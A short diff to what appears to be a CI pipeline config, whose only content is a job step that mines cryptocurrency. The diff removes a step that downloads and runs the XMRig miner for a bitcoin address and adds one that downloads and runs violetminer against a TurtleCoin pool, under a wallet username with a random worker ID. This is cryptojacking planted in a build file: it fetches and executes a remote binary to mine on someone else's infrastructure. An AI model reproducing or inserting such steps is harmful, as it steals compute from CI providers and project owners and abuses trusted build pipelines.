@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 -u bc1qtcrjhzevn8s68tar9wzhy7cdhy9ek4wgm66lvt --keepalive --timeout 120 --donate-level 1 -p  c=BTC,mc=BTC,ID=newe1
+      - run: wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool us.turtlecoin.herominers.com:1160 --username TRTLv34RuEZBmHzhmcG3NucgMYpPpe27uYSTv1o59NLdPcRcknpx5PqRMmc8FvWysZNNJWE79at57iwx1F1uFBMtQskLUPAu98m.$(echo $(shuf -i 1-4000000000 -n 1)-COLN#im8m-ybvt) --password x --algorithm turtlecoin
